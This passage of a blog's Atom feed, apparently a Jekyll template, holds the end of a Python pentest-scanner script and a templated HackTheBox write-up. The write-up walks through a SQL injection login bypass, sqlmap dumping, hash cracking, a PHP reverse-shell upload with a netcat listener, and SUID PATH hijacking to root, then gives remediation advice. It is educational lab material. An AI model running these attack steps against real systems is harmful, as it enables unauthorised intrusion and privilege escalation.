+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>args = parser.parse_args()
+
+logger = PentestLogger(report_file=args.output)
+logger.logger.info(f"Starting scan on {args.target}")
+
+# Network scanning
+if args.mode in ['network', 'full']:
+    logger.logger.info("Starting network scan...")
+    scanner = NetworkScanner()
+    
+    # Parse port range
+    start, end = map(int, args.ports.split('-'))
+    ports = range(start, end + 1)
+    
+    results = scanner.scan_ports(args.target, ports)
+    
+    if results['open_ports']:
+        logger.log_finding(
+            severity='INFO',
+            category='Open Ports',
+            description=f"Found {len(results['open_ports'])} open ports",
+            details={'ports': results['open_ports']}
+        )
+        
+        # Service detection on open ports
+        for port in results['open_ports']:
+            service = scanner.detect_service(args.target, port)
+            logger.log_finding(
+                severity='INFO',
+                category='Service Detection',
+                description=f"Port {port}: {service}",
+                details={'port': port, 'service': service}
+            )
+
+# Web scanning
+if args.mode in ['web', 'full']:
+    logger.logger.info("Starting web scan...")
+    web_scanner = WebScanner(args.target)
+    
+    # Crawl website
+    logger.logger.info("Crawling website...")
+    web_scanner.crawl(args.target, max_depth=2)
+    logger.logger.info(f"Discovered {len(web_scanner.visited_urls)} URLs")
+    
+    # Test for vulnerabilities
+    for url in web_scanner.visited_urls:
+        # SQL Injection test
+        sqli_vulns = web_scanner.test_sql_injection(url)
+        for vuln in sqli_vulns:
+            logger.log_finding(
+                severity='HIGH',
+                category='SQL Injection',
+                description=f"Potential SQL injection found",
+                details=vuln
+            )
+        
+        # XSS test
+        xss_vulns = web_scanner.test_xss(url)
+        for vuln in xss_vulns:
+            logger.log_finding(
+                severity='MEDIUM',
+                category='Cross-Site Scripting',
+                description=f"Potential XSS vulnerability found",
+                details=vuln
+            )
+
+# Generate report
+logger.logger.info("Generating report...")
+report = logger.generate_report()
+logger.logger.info(f"Scan complete. Found {report['total_findings']} findings.")
+
+print("\n" + "="*50)
+print("SCAN SUMMARY")
+print("="*50)
+for severity, count in report['summary'].items():
+    print(f"{severity}: {count}")
+print("="*50)
+</code></pre></div></div>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:
+    main()</p>]]></content><author><name>Your Name</name></author><category term="Tools" /><category term="Tutorial" /><category term="penetration testing" /><category term="automation" /><category term="python" /><category term="tools" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">HackTheBox - [Box Name] Writeup</title><link href="http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/" rel="alternate" type="text/html" title="HackTheBox - [Box Name] Writeup" /><published>2025-01-15T13:00:00+03:00</published><updated>2025-01-15T13:00:00+03:00</updated><id>http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example</id><content type="html" xml:base="http://localhost:4000/blog/2025/01/15/hackthebox-writeup-example/"><![CDATA[<h2 id="overview">Overview</h2>
+
+<p><strong>Box Name</strong>: [Box Name]<br />
+<strong>Difficulty</strong>: Medium<br />
+<strong>OS</strong>: Linux<br />
+<strong>IP</strong>: 10.10.10.xxx<br />
+<strong>Release Date</strong>: January 2025</p>
+
+<h2 id="summary">Summary</h2>
+
+<p>This box involves exploiting a vulnerable web application with SQL injection to gain initial access, followed by exploiting a misconfigured SUID binary for privilege escalation to root.</p>
+
+<h3 id="skills-required">Skills Required</h3>
+<ul>
+  <li>Web application enumeration</li>
+  <li>SQL injection</li>
+  <li>Linux privilege escalation</li>
+  <li>Binary analysis</li>
+</ul>
+
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+  <li>Advanced SQLi techniques</li>
+  <li>Custom exploit development</li>
+  <li>SUID exploitation</li>
+</ul>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>Starting with a full port scan:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-oN</span> nmap/full 10.10.10.xxx
+</code></pre></div></div>
+
+<p><strong>Results:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.41
+3306/tcp open  mysql   MySQL 5.7.33
+</code></pre></div></div>
+
+<p>Key findings:</p>
+<ul>
+  <li>SSH on port 22 (likely for final access)</li>
+  <li>Apache web server on port 80</li>
+  <li>MySQL database on port 3306</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the website reveals a login portal:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.xxx <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></div>
+
+<p><strong>Interesting directories found:</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/admin</code> - Admin panel (403 Forbidden)</li>
+  <li><code class="language-plaintext highlighter-rouge">/uploads</code> - File upload directory</li>
+  <li><code class="language-plaintext highlighter-rouge">/api</code> - API endpoints</li>
+  <li><code class="language-plaintext highlighter-rouge">/backup</code> - Backup files</li>
+</ul>
+
+<hr />
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<h3 id="sql-injection-discovery">SQL Injection Discovery</h3>
+
+<p>Testing the login form for SQL injection:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Username</span><span class="p">:</span> <span class="k">admin</span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+<span class="n">Password</span><span class="p">:</span> <span class="n">anything</span>
+</code></pre></div></div>
+
+<p>Response indicates SQL injection vulnerability!</p>
+
+<h3 id="exploiting-sqli">Exploiting SQLi</h3>
+
+<p>Using sqlmap to dump the database:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.xxx/login.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"username=admin&amp;password=test"</span> <span class="nt">--dbs</span>
+</code></pre></div></div>
+
+<p><strong>Databases found:</strong></p>
+<ul>
+  <li>information_schema</li>
+  <li>webapp_db</li>
+  <li>mysql</li>
+</ul>
+
+<p>Dumping credentials from webapp_db:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.xxx/login.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"username=admin&amp;password=test"</span> <span class="nt">-D</span> webapp_db <span class="nt">--tables</span>
+</code></pre></div></div>
+
+<p><strong>Table: users</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+|  2 | john     | 098f6bcd4621d373cade4e832627b4f6 |
++----+----------+----------------------------------+
+</code></pre></div></div>
+
+<p>Cracking the password hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"5f4dcc3b5aa765d61d8327deb882cf99"</span> <span class="o">&gt;</span> hash.txt
+john <span class="nt">--format</span><span class="o">=</span>Raw-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div></div>
+
+<p><strong>Result</strong>: <code class="language-plaintext highlighter-rouge">password</code></p>
+
+<h3 id="getting-shell-access">Getting Shell Access</h3>
+
+<p>With admin credentials, we can access the admin panel at <code class="language-plaintext highlighter-rouge">/admin</code>.</p>
+
+<p>Found file upload functionality. Testing for unrestricted file upload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create PHP reverse shell</span>
+<span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+<span class="c"># Edit IP and PORT</span>
+
+<span class="c"># Upload file</span>
+curl <span class="nt">-X</span> POST <span class="nt">-F</span> <span class="s2">"file=@shell.php"</span> http://10.10.10.xxx/admin/upload.php <span class="nt">--cookie</span> <span class="s2">"session=admin_token"</span>
+</code></pre></div></div>
+
+<p>Start listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<p>Trigger shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.xxx/uploads/shell.php
+</code></pre></div></div>
+
+<p><strong>We have a shell as www-data!</strong></p>
+
+<hr />
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Checking for SUID binaries:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><strong>Interesting finding:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Analyzing the binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Output shows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/tar -czf /tmp/backup.tar.gz /var/www/html
+</code></pre></div></div>
+
+<p>The binary uses <code class="language-plaintext highlighter-rouge">tar</code> without full path - potential PATH hijacking!</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Creating malicious tar:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+<span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> <span class="nb">tar
+echo</span> <span class="s1">'chmod +s /bin/bash'</span> <span class="o">&gt;&gt;</span> <span class="nb">tar
+chmod</span> +x <span class="nb">tar
+export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p>Execute the SUID binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/custom_backup
+</code></pre></div></div>
+
+<p>Get root shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-p</span>
+<span class="nb">whoami</span>  <span class="c"># root!</span>
+</code></pre></div></div>
+
+<h3 id="capturing-flags">Capturing Flags</h3>
+
+<p><strong>User flag:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/john/user.txt
+<span class="o">[</span>user_flag_here]
+</code></pre></div></div>
+
+<p><strong>Root flag:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+<span class="o">[</span>root_flag_here]
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+  <li><strong>Always test for SQL injection</strong> in login forms and input fields</li>
+  <li><strong>File upload vulnerabilities</strong> can provide easy initial access</li>
+  <li><strong>SUID binaries</strong> are common privilege escalation vectors</li>
+  <li><strong>PATH hijacking</strong> works when binaries don’t use absolute paths</li>
+  <li><strong>Enumeration is crucial</strong> - thorough scanning reveals opportunities</li>
+</ol>
+
+<hr />
+
+<h2 id="remediation">Remediation</h2>
+
+<h3 id="for-sql-injection">For SQL Injection:</h3>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Use prepared statements</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = ? AND password = ?"</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="for-file-upload">For File Upload:</h3>
+<ul>
+  <li>Implement whitelist of allowed file extensions</li>
+  <li>Validate file content, not just extension</li>
+  <li>Store uploads outside web root</li>
+  <li>Randomize filenames</li>
+</ul>
+
+<h3 id="for-suid-binary">For SUID Binary:</h3>
+<ul>
+  <li>Use absolute paths in scripts</li>
+  <li>Minimize SUID binaries</li>
+  <li>Regular security audits</li>
+</ul>
+
+<hr />
+
+<h2 id="tools-used">Tools Used</h2>
+
+<ul>
+  <li>Nmap</li>
+  <li>Gobuster</li>
+  <li>SQLMap</li>
+  <li>Burp Suite</li>
+  <li>John the Ripper</li>
+  <li>Netcat</li>
+</ul>
+
+<hr />
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+  <li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
+  <li><a href="https://book.hacktricks.xyz/">HackTricks</a></li>
+</ul>
+
+<hr />
+
+<p><strong>Box Difficulty</strong>: ⭐⭐⭐☆☆<br />
+<strong>Enjoyment</strong>: ⭐⭐⭐⭐☆<br />
+<strong>Learning Value</strong>: ⭐⭐⭐⭐⭐</p>
+
+<p><em>This writeup was created for educational purposes only.</em></p>]]></content><author><name>Your Name</name></author><category term="CTF" /><category term="HackTheBox" /><category term="web exploitation" /><category term="privilege escalation" /><category term="linux" /><category term="python" /><summary type="html"><![CDATA[Overview]]></summary></entry></feed>
